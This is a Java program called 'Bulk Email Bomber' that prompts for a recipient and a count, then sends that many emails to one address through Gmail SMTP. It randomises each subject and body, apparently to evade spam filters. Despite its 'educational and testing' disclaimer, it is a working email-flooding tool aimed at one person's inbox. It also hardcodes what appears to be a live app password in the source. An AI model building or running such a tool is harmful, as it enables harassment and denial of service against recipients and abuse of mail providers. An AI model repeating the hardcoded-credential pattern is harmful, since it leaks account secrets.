package com.github.GraycenMacNeill.BulkEmailBomber;

import javax.mail.*;
import javax.mail.internet.*;
import java.util.*;
import java.lang.Thread;
import java.util.concurrent.ThreadLocalRandom; // Import for random number generation

public class Main {

    public static void main(String[] args) {

        Scanner input = new Scanner(System.in);

        // Get email details and properties
        String recipient, sender, subjectBase, bodyBase, properties;
        int emails;

        System.out.println("Bulk Email Bomber");
        System.out.println("Created by Graycen MacNeill - https://github.com/GraycenMacNeill/BulkEmailBomber");
        System.out.println("\nBulk Email Bomber is a tool designed to efficiently send large volumes of emails to a specific recipient.");
        System.out.println("This tool can be used for purposes such as mass notifications or testing email infrastructure.");
        System.out.println("\nHaving a Google App Password Key is required to use this program. Create one with the link below:");
        System.out.println("https://knowledge.workspace.google.com/kb/how-to-create-app-passwords-000009237");
        System.out.println("\u001B[31m" +  "\nDisclaimer: This application is intended for educational and testing purposes only. Misuse of this code is");
        System.out.println("strictly prohibited and violates the CAN-SPAM Act and other data protection laws, and may result in legal");
        System.out.println("consequences for the user depending on which country, nation, or state they reside in." + "\u001B[0m");
        
        System.out.print("\nEnter recipient email address: ");
        recipient = input.nextLine();

        System.out.print("Enter sender email address (consider using a dedicated account): ");
        sender = input.nextLine();

        System.out.println("Email Subject");
        System.out.print("Type in as many words as you want to here, separated by spaces: ");
        subjectBase = input.nextLine();

        System.out.println("Email Body");
        System.out.print("Type in as many words as you want to here, separated by spaces: ");
        bodyBase = input.nextLine();

        System.out.print("Enter the number of emails to send: ");
        emails = input.nextInt();

        // Gmail configuration (use Gmail's implemented App Password)
        Properties mailProps = new Properties();
        mailProps.put("mail.smtp.host", "smtp.gmail.com");
        mailProps.put("mail.smtp.port", 587);
        mailProps.put("mail.smtp.auth", true);
        mailProps.put("mail.smtp.starttls.enable", true);

        // Create a Session object with password authentication
        Session session = Session.getInstance(mailProps, new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(sender, "cnfe xylk expo suzq"); // Replace with your App Password
            }
        });

        // Loop to send emails
        for (int i = 0; i < emails; i++) {
            try {
                // Create a new message object for each email
                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress(sender));

                // Generate random subject and body variations
                String randomSubject = generateRandomString(subjectBase);
                String randomBody = generateRandomString(bodyBase);

                message.setSubject(randomSubject);
                message.setText(randomBody);

                // Update recipient address
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipient));

                Transport.send(message);
                System.out.println("Email sent to " + recipient);
            } catch (MessagingException e) {
                e.printStackTrace();  // Print specific error message
            }
        }

    }

    // Function to generate random string with a specified base string
    public static String generateRandomString(String baseString) {
        int randomLength = ThreadLocalRandom.current().nextInt(baseString.length() + 5); // Generate random length up to 5 characters longer than base
        StringBuilder randomStringBuilder = new StringBuilder(randomLength);
        for (int j = 0; j < randomLength; j++) {
            int randomIndex = ThreadLocalRandom.current().nextInt(baseString.length());
            randomStringBuilder.append(baseString.charAt(randomIndex));
        }
        return randomStringBuilder.toString();
    }
    public static void delay(int milliseconds) {
        try {
            Thread.sleep(milliseconds);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

    }
}